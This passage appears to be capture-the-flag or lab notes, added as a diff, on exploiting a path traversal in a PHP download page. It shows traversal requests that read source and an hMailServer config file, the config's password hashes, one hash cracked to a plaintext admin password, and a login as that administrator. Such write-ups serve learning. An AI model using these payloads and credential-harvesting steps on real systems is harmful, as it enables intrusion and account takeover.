@@ -76,3 +76,58 @@ GET /download.php?file=instructions.pdf HTTP/1.1
 
 I can pass this and return the correct page:
 GET /download.php?file=../index.php
+
+Kinda making progress here, I found a list of important PHP files (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Common-PHP-Filenames.txt) and this one returned some info:
+GET /download.php?file=../download.php
+
+The most important part returned is this:
+$file_path = 'C:/wwwroot/instructions/'
+
+Which is essentially the directory for which we are initially looking for files.  This can help us navigate around the system a bit more accurately.  At this point, I want to see if a config file is here for the mail server.
+
+Found the correct location: GET /download.php?file=../../Program+Files+(x86)\hMailServer\Bin\hMailServer.ini, below are the contents:
+
+[Directories]
+
+ProgramFolder=C:\Program Files (x86)\hMailServer
+
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+
+[GUILanguages]
+
+ValidLanguages=english,swedish
+
+[Security]
+
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+
+[Database]
+
+Type=MSSQLCE
+
+Username=
+
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+
+PasswordEncryption=1
+
+Port=0
+
+Server=
+
+Database=hMailServer
+
+Internal=1
+
+Using (https://hashes.com/en/decrypt/hash), we can at least decrypt the admin hash, not whatever the other one is
+841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
+
+Using this password, I was able to setup Thunderbird and login as the administrator user, but I'm not really sure what to look for here...
